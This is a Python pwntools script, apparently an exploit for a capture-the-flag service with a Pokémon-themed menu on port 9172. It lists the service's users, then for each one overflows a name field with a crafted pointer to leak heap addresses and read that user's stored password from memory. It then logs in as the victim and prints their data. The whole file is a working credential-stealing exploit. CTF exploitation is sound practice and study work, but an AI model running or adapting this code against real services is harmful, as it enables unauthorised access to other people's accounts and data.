#!/usr/bin/env python3

import sys
from pwn import *
from checklib import *

ip = sys.argv[1]

def get_password(r, username):
    me_addr = 0x605a70

    u = rnd_username()
    p = rnd_password()

    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("Input username: ")
    r.sendline(u)
    r.recvuntil("Input password: ")
    r.sendline(p)

    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Input username: ")
    r.sendline(u)
    r.recvuntil("Input password: ")
    r.sendline(p)

    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Enter pokemon description: ")
    r.sendline("KEK")
    r.recvuntil("Give it a name: ")
    r.send(b"A" * 56 + p32(me_addr))

    r.recvuntil("> ")
    r.sendline("3")

    r.recvuntil("Description: ")
    leak = r.recvuntil(b"\n Power").strip(b"\n Power")
    leak = u64(leak + b"\x00" * (8 - len(leak)))
    heap_base = leak - 0x17812f0 + 0x1781000

    password_addr = heap_base - 0x20ea000 + 0x20ea8f0

    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Enter pokemon description: ")
    r.sendline("KEK")
    r.recvuntil("Give it a name: ")
    r.send(b"A" * 56 + p32(password_addr))

    r.recvuntil("> ")
    r.sendline("2")

    r.recvuntil("Who do you want to fight: ")
    r.sendline(username)

    r.recvuntil("> ")
    r.sendline("3")

    r.recvuntil("Pokemon #2")
    r.recvuntil("Description: ")
    s = r.recvline().decode().strip()

    r.recvuntil("> ")
    r.sendline("4")

    return s

r = remote(ip, 9172)
r.recvuntil("> ")
r.sendline("3")
s = r.recvuntil("Welcome").decode().strip("Welcome").strip().split("\n")
r.close()

for u in s:
    r = remote(ip, 9172)
    p = get_password(r, u)
    r.close()
    r = remote(ip, 9172)
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Input username: ")
    r.sendline(u)
    r.recvuntil("Input password: ")
    r.sendline(p)
    r.recvuntil("> ")
    r.sendline("3")
    print(r.recvuntil("Welcome"), flush=True)